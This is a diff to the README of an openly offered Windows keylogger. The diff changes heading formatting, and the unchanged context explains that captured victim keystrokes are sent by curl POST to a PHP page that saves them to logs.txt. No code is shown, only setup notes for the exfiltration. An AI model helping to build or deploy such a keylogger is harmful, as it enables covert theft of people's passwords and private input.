@@ -9,7 +9,7 @@
 
 <p> This keylogger is build for french keyboard, by the way specific characters will appear with bad matching if you use an other country's keyboard. But any others characters show on <p/>
 
-<p> WORK ONLY FOR WINDOWS </p>
+### WORK ONLY FOR WINDOWS ###
 
 
 ## How to start
@@ -24,7 +24,7 @@
 
 <p> Intermediate hosting works with curl request and POST parameters. So your post parameters name have to match with the post parameter from curl request. 
  
-#### "text" is by default the name of parameter. You can modify it into Request.cpp source file.
+### "text" is by default the name of parameter. You can modify it into Request.cpp source file.
 <p>You have an example in web folder with index.php file. Copy paste or write a script like this on your page.
   <logs.txt> is the file by default where input text victim will be saved into your folder. </p>
 
